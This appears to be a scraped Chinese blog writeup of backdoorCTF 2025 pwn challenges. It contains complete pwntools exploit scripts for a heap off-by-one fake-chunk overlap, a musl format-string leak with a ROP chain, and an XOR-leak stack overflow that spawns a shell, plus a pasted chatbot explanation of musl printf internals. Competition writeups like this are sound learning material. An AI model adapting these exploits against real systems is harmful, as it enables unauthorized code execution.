如果不是一个真实的chunk，这个检查很难通过，但是我们现在有了已经泄露的heapbase，可以伪造fd和bk均为fake_chunk的地址，这样就没必要使得prev_chunk是一个真实的被free了的chunk\n所以直接一条龙服务，在一个chunk里面放假的chunk header，fd，bk即可，然后利用off-by-one，但是prev chunk是我们的假chunk即可。这样就可以造成堆重叠，从而泄露secret\nexp\n#!/usr/bin/env python3 from pwn import * from pwncli import * context(os='linux',arch = 'amd64') #context.terminal = ['tmux', 'new-window', '-n', 'debug' ] filename = \"chall\" + \"_patched\" libcname = \"/home/wgg/.config/cpwn/pkgs/2.35-0ubuntu3.11/amd64/libc6_2.35-0ubuntu3.11_amd64/lib/x86_64-linux-gnu/libc.so.6\" host = \"remote.infoseciitr.in\" port = 8000 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = ''' b main set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.35-0ubuntu3.11/amd64/libc6-dbg_2.35-0ubuntu3.11_amd64/usr/lib/debug set directories /home/wgg/.config/cpwn/pkgs/2.35-0ubuntu3.11/amd64/glibc-source_2.35-0ubuntu3.11_all/usr/src/glibc/glibc-2.35 ''' def sa(a,b): sh.sendafter(a, b) def sla(a, b): sh.sendlineafter(a, b) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) # ========== 程序交互函数 ========== def prepare_gift(slot, size): \"\"\" 功能1: 分配堆块 参数: slot: 礼物槽位 (0-15) size: 堆块大小 (0x50 \u003c size \u003c= 0x1000) \"\"\" sla(b\"\u003e \", b\"1\") sla(b\"Gift Slot: \", str(slot).encode()) sla(b\"Gift Size: \", str(size).encode()) def rewrite_card(slot, data): \"\"\" 功能2: 写入数据到堆块 参数: slot: 礼物槽位 (0-15) data: 要写入的数据 (bytes) 注意: 存在Off-by-One漏洞！如果len(data) == size，会溢出1字节 \"\"\" sla(b\"\u003e \", b\"2\") sla(b\"Gift Slot: \", str(slot).encode()) sa(b\"Card Message: \", data) def check_gift(slot): \"\"\" 功能3: 读取堆块内容 参数: slot: 礼物槽位 (0-15) 返回: 堆块内容 (bytes) \"\"\" sla(b\"\u003e \", b\"3\") sla(b\"Gift Slot: \", str(slot).encode()) sh.recvuntil(b\"Gift Contents: \") return sh.recvline() def deliver_gift(slot): \"\"\" 功能4: 释放堆块 参数: slot: 礼物槽位 (0-15) \"\"\" sla(b\"\u003e \", b\"4\") sla(b\"Gift Slot: \", str(slot).encode()) def master_key(secret): \"\"\" 功能5: 验证密钥并获取flag 参数: secret: 16字节密钥 (bytes) \"\"\" sla(b\"\u003e \", b\"5\") sa(b\"Enter Santa's Secret Code: \", secret) def load_secret(): \"\"\" 功能6: 从/dev/urandom加载16字节随机密钥 注意: 会在堆上分配0x20字节chunk存储密钥但不释放！ \"\"\" sla(b\"\u003e \", b\"6\") def close_workshop(): \"\"\" 功能7: 退出程序 \"\"\" sla(b\"\u003e \", b\"7\") # ========== 辅助函数 ========== def leak_heap(): \"\"\" 程序启动时会自动泄露一个堆地址 返回: 堆地址 \"\"\" sh.recvuntil(b\"Ho...Ho...Ho..\") heap_leak = int(sh.recv(14), 16) log.success(f\"Heap leak: {hex(heap_leak)}\") return heap_leak sh = start() # 1. 接收banner和泄露的堆地址 heap_leak = leak_heap() heap_base = heap_leak - 0x2a0 # 需要根据实际调试调整偏移 log.success(f\"Heap base: {hex(heap_base)}\") prepare_gift(0, 0x588) load_secret() prepare_gift(1, 0x58) prepare_gift(2, 0x4f8) rewrite_card(0, b'A' * 0xc0 + p64(0x0) + p64(0x551) + p64(heap_base + 0x380) * 2) rewrite_card(1, b'A' * 0x50 + p64(0x550)) prepare_gift(3, 0x500) prepare_gift(6, 0x68) prepare_gift(4, 0x500) prepare_gift(5, 0x68) deliver_gift(3) deliver_gift(4) deliver_gift(2) prepare_gift(9, 0xf00) gift = check_gift(9) key = gift[0x4c0:0x4d0] print(len(key)) master_key(key) sh.interactive() Lolimancer 本题的特殊之处在于libc是musl，而不是glibc\nmusl的printf函数有点不同，下面给gemini的回答\nTL;DR：musl的printf中，在使用第n个参数时，必须使用前n-1个参数，换句话说如果想要''%6$p'，只能'%p' * 6或者'%1$p%2%p%3$p%4$p%5$p%6$p'\n1. 核心矛盾：va_list 的单向性 要理解这个漏洞的区别，必须先理解 C 语言可变参数（va_list）的工作原理：\n栈是线性的： 参数在栈上（或寄存器中）是一个接一个紧挨着排放的。 读取是单向的： 想要读取第 6 个参数，必须先知道第 1、2、3、4、5 个参数的大小（是 int 4字节？还是 double 8字节？），然后逐个跳过它们。你不能直接“瞬移”到第 6 个位置。 2. Glibc 的做法：宽容与猜测 glibc 的 vfprintf 非常复杂（代码量巨大），它采用了一种**“两遍扫描 + 内部缓冲”**的策略，并且带有很强的容错性。\n机制： 当 glibc 看到 %6$p 时，它意识到使用了位置参数。 填补空缺： 它会扫描整个格式化字符串。如果发现缺少第 1-5 个参数的定义，glibc 为了能让你拿到第 6 个，它在内部处理时通常会默认假设缺失的参数是 int（或字长宽度）。 结果： 它通过假设跳过了前 5 个位置，成功读取了第 6 个位置的数据并打印。 代价： 代码极其臃肿，且这种“猜测”在某些架构下可能不安全。 3. Musl 的做法：严格与极简 musl 的设计哲学是代码极简且严格遵循 POSIX 标准。它的 vfprintf.c 逻辑非常直白，正是这种直白导致了你看到的结果。\n源码逻辑复盘（基于 musl src/stdio/vfprintf.c） Musl 处理位置参数的伪代码逻辑如下：\nC\n// musl vfprintf.c 的简化逻辑\rint vfprintf(..., const char *fmt, va_list ap) {\r// 1. 扫描格式化字符串，构建类型表\r// nl_type[i] 存储第 i 个参数的类型\rfor (...) {\rif (sees \"%6$p\") nl_type[6] = POINTER;\r}\r// 2. 这里的 nl_type[1] 到 nl_type[5] 都是 0 (UNKNOWN)！\r// 3. 尝试读取参数存入本地缓存 nl_arg\rfor (i = 1; i \u003c= max_arg; i++) {\rswitch (nl_type[i]) {\rcase INT: nl_arg[i].i = va_arg(ap, int); break;\rcase POINTER: nl_arg[i].p = va_arg(ap, void*); break;\r// ... 其他类型 ...\rcase 0: // !!! 致命问题 !!!\r// 标准说：如果用到了第N个参数，前N-1个必须有定义。\r// Musl 此时不知道第 i 个参数多大，无法移动 ap 指针。\r// 此时 musl 判定为非法格式，直接停止处理或报错返回。\rreturn -1; }\r}\r} 为什么是“未定义行为”或崩溃？ 什么都不打印（返回 -1）： 当 musl 发现第 1-5 个参数类型未知时，它无法执行 va_arg(ap, ???) 来跳到第 6 个参数。它物理上无法计算出第 6 个参数的内存地址。因此，它通常会检测到这个“空洞（Hole）”，停止解析，并返回错误代码（通常是 -1）。如果你的程序没有检查 printf 的返回值，看起来就是“什么都没发生”。 崩溃（Crash）： 在某些特定版本或编译优化的 musl 中，如果在某些极端的漏洞利用场景下（或者如果你混用了 % 和 %n$），内部的状态机可能会因为索引越界或读取了未初始化的 nl_arg 数组而崩溃。特别是如果它试图读取一个未被正确 pop 出来的指针并解引用它，程序就会立即 Segfault。 4. 为什么 POSIX 标准站在 Musl 这一边？ POSIX 标准关于 printf 有明确规定：\n“When numbered argument specifications are used, specifying the Nth argument requires that all the leading arguments, from the first to the (N-1)th, are specified in the format string.”\n（当使用编号参数说明符时，指定第 N 个参数要求从第 1 到第 N-1 个参数都必须在格式字符串中指定。）\n你的输入： %6$p 违规点： 缺少 1, 2, 3, 4, 5 的定义。 结论： 这是一个非法的格式字符串。musl 拒绝服务是符合标准的；glibc 帮你打印出来是它自己的“私自扩展（GNU Extension）”行为。 5. 对漏洞利用（Exploit）的影响 这对 CTF 或实战漏洞挖掘有巨大影响：\n在 Glibc 上： 你可以随意泄露栈深处的内存，例如 %100$p，即使你不知道前 99 个参数是什么。这使得泄露 canary 或 libc基址非常容易。 在 Musl 上： 格式化字符串漏洞利用难度剧增。 你不能跳过参数。如果你想泄露第 6 个参数，你必须构造一个格式化字符串，显式地消耗掉前 5 个参数，例如： %1$p%2$p%3$p%4$p%5$p%6$p 如果 payload 长度受限（例如缓冲区很小），你就无法构造出足够长的填充来触达深层的栈数据。 1. 核心罪魁祸首：nl_arg 数组 在 musl 的 src/stdio/vfprintf.c (或其调用的 printf_core) 中，为了处理 %n$ 这种参数，它必须把参数从 va_list 拷贝到一个本地数组里方便随机访问。\n关键代码定义大致如下：\nC\n// 简化后的 musl 内部变量定义\runion arg {\ruintmax_t i;\rdouble f;\rvoid *p; // %n 对应的指针存在这里\r};\r// !!! 重点在这里 !!!\r// 这个数组是在栈上分配的局部变量，且没有被初始化为0！\runion arg nl_arg[NL_ARGMAX+1]; uint32_t nl_type[NL_ARGMAX+1] = {0}; // 类型表倒是初始化了 2. 崩溃流程复盘 当你输入 %4$n 且没有定义 1, 2, 3 时，发生了以下连锁反应：\n第一步：类型扫描（Pass 1） 扫描器发现 %4$n，于是标记：\nnl_type[4] = POINTER; nl_type[1], nl_type[2], nl_type[3] 依然是初始值 0 (也就是 NONE)。 第二步：参数获取（Pass 2）—— 漏洞发生地 理论上，musl 应该在发现 nl_type[1] 为 0 时直接 return -1 报错。\n但是，在某些特定的编译优化（Optimization）、特定版本或者如果程序逻辑因为其他未定义行为（Undefined Behavior）而“意外”地绕过了检查（或者仅仅是因为你的调试环境与标准源码有细微出入），程序进入了后续的执行流。\n更关键的是 nl_arg 的状态：\n因为 nl_arg 是局部变量且未初始化，它的内存里装的是“上一层函数”栈帧遗留下来的垃圾数据。 musl 并没有执行 va_arg 来填充 nl_arg[4]（因为之前的参数缺失，无法计算偏移）。 所以，nl_arg[4].p 的值，就是此刻栈上那个位置原本存在的任何数值。 第三步：执行写入 当 printf 执行到 %4$n 时，它执行类似这样的操作：\nC\n// 伪代码\rint *ptr = nl_arg[4].p; // 取出指针\r*ptr = count; // 尝试写入字符计数 3. 为什么是 0x38 或 0x1000？ 这就是最有趣的地方。因为 nl_arg[4] 是未初始化的栈内存，它直接继承了栈上的“脏数据”。\n0x38 (十进制 56):\n这很可能是栈上残留的一个小整数。比如上一个被调用的函数中有一个循环计数器 i 增加到了 56，或者是一个结构体的偏移量，或者是某个标志位。当 vfprintf 分配栈帧时，nl_arg[4] 刚好落在了这个位置。\n程序试图向内存地址 0x0000000000000038 写入数据。这是内核保留区，不可写 -\u003e Segmentation Fault。 0x1000:\n这通常是页对齐的大小。可能是上一个函数的某个缓冲区大小参数，或者是某个被 free 掉的堆块的头部残留数据。\n4. Glibc vs Musl：行为对比图解 我为你生成了一张内存行为对比图，以便更直观地理解这种差异。\ngoogle:search{queries:[musl vfprintf nl_arg uninitialized stack usage,musl printf %n crash mechanism]}\n对比总结：\n行为 Glibc Musl 缺失参数处理 猜测并填充。它假设缺失的参数是默认宽度，强制计算出 %4$ 的偏移量。 拒绝或未定义。标准逻辑是报错，但若触发未定义行为，则使用栈残留数据。 指针来源 实际的栈/寄存器数据（即使是错位的数据，也是真实存在的地址）。 本地局部变量数组 nl_arg。 崩溃原因 通常不容易崩，除非算出的地址不可访问。 极易崩。因为使用的是未初始化的“脏栈数据”，这些数据（如 0x38）作为指针通常是非法的。 所以这道题的格式化字符串漏洞\n只能通过一连串的%p来进行泄露\n可以看到还有一个栈溢出\n泄露之后ROP即可\nexp\n#!/usr/bin/env python3 from pwn import * from pwncli import * context(os='linux',arch = 'amd64') #context.terminal = ['tmux', 'new-window', '-n', 'debug' ] filename = \"chall\" + \"_patched\" libcname = \"./libc.so\" host = \"remote.infoseciitr.in\" port = 8003 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = ''' ''' def sa(a,b): sh.sendafter(a, b) def sla(a, b): sh.sendlineafter(a, b) def start(): env_vars = {\"LD_LIBRARY_PATH\": \".\"} if args.GDB: return gdb.debug(elf.path, gdbscript = gs, env=env_vars) elif args.REMOTE: return remote(host, port) else: return process(elf.path, env=env_vars) sh = start() # Your exploit here payload1 = b'%p%p' sh.send(payload1) stack = int(sh.recv(14), base=16) libc_base = int(sh.recv(14), base=16)-0xb5b44 + 0x3fa0 log.success(\"stack: \" + hex(stack)) log.success(\"libc_base: \" + hex(libc_base)) payload2 = b'%p' * 0x14 sa(\"One more time and you will be strong!!\\n\", payload2) sh.recvuntil(\"0x7025702570257025000000x1\") canary = int(sh.recv(18), base=16) log.success(\"canary: \" + hex(canary)) system = libc_base + libc.sym['system'] rdi_ret = libc_base + 0x00000000000142a5 binsh = libc_base + next(libc.search(\"/bin/sh\")) payload = flat([ b'A' * 24, p64(canary), p64(stack + 0xd8), p64(rdi_ret), p64(binsh), p64(rdi_ret + 1), p64(system), ]) #print(hex(rdi_ret)) sla(\"I think you do not need warmup!!\", payload) sh.interactive() ","wordCount":"2068","inLanguage":"en","image":"https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-12-08T23:30:24+08:00","dateModified":"2025-12-08T23:30:24+08:00","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wgggggggg.github.io/posts/ctf/backdoorctf2025-writeup/"},"publisher":{"@type":"Organization","name":"Wgg's Blog Site","logo":{"@type":"ImageObject","url":"https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://wgggggggg.github.io/ accesskey=h title="Wgg (Alt + H)"><img src=https://wgggggggg.github.io/apple-touch-icon.png alt aria-label=logo height=35>Wgg</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://wgggggggg.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://wgggggggg.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://example.org title=example.org><span>example.org</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://wgggggggg.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://wgggggggg.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">backdoorCTF2025 PWN Writeup</h1><div class=post-meta><span title='2025-12-08 23:30:24 +0800 CST'>December 8, 2025</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;2068 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/CTF/backdoorCTF2025-WriteUp/index.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><h1 id=backdoorctf-2025-pwn-writeup>backdoorCTF 2025 PWN Writeup<a hidden class=anchor aria-hidden=true href=#backdoorctf-2025-pwn-writeup>#</a></h1><h2 id=devils-convergence>Devil&rsquo;s Convergence<a hidden class=anchor aria-hidden=true href=#devils-convergence>#</a></h2><p>很简单的一道题，将输入的8个字节跟libc地址异或，然后输出，所以我们可以得到libc地址</p><p>还存在栈溢出漏洞，直接写ROP拿shell即可</p><p>exp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwncli</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ]</span>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;chal_chainsawman&#34;</span> <span class=o>+</span> <span class=s2>&#34;_patched&#34;</span>
</span></span><span class=line><span class=cl><span class=n>libcname</span> <span class=o>=</span> <span class=s2>&#34;/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;remote.infoseciitr.in&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>8005</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>libcname</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libcname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug
</span></span></span><span class=line><span class=cl><span class=s1>set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sa</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sla</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span> <span class=o>=</span> <span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cyclic_xor</span><span class=p>(</span><span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>key</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    对一个字节串（data）与一个 8 字节的密钥（key）进行循环异或（XOR）操作。
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Args:
</span></span></span><span class=line><span class=cl><span class=s2>        data: 需要进行异或操作的输入字节串。
</span></span></span><span class=line><span class=cl><span class=s2>        key: 8 字节的密钥。
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Returns:
</span></span></span><span class=line><span class=cl><span class=s2>        异或操作后的结果字节串。
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Raises:
</span></span></span><span class=line><span class=cl><span class=s2>        ValueError: 如果密钥长度不是 8 字节，则抛出异常。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 检查密钥长度是否为 8 字节</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;密钥 (key) 必须是 8 字节长。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 用于存储结果的字节列表</span>
</span></span><span class=line><span class=cl>    <span class=n>result_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 获取数据和密钥的长度</span>
</span></span><span class=line><span class=cl>    <span class=n>data_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>key_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>  <span class=c1># key_len 此时应为 8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 遍历数据中的每个字节</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>data_len</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 确定当前字节 i 对应的密钥字节的索引 j</span>
</span></span><span class=line><span class=cl>        <span class=c1># j = i % key_len 会让 j 在 0 到 7 之间循环</span>
</span></span><span class=line><span class=cl>        <span class=n>j</span> <span class=o>=</span> <span class=n>i</span> <span class=o>%</span> <span class=n>key_len</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># 对数据字节和密钥字节进行 XOR 运算</span>
</span></span><span class=line><span class=cl>        <span class=c1># data[i] 和 key[j] 都是整数（0-255）表示的字节值</span>
</span></span><span class=line><span class=cl>        <span class=n>xor_byte</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>key</span><span class=p>[</span><span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># 将 XOR 结果添加到结果列表中</span>
</span></span><span class=line><span class=cl>        <span class=n>result_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>xor_byte</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 将整数列表转换回字节串并返回</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>result_list</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># 自定义 dest 内容</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s2>&#34;Submit to her control: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;essence: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>low4</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s2>&#34;to War: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;essence: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>high4</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>low4</span> <span class=o>+</span> <span class=n>high4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;system: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>system_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>system_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>rdi_ret</span> <span class=o>=</span> <span class=mh>0x000000000010f78b</span> <span class=o>+</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl><span class=n>binsh_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>80</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi_ret</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>binsh_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s2>&#34;contract: &#34;</span><span class=p>,</span> <span class=n>cyclic_xor</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
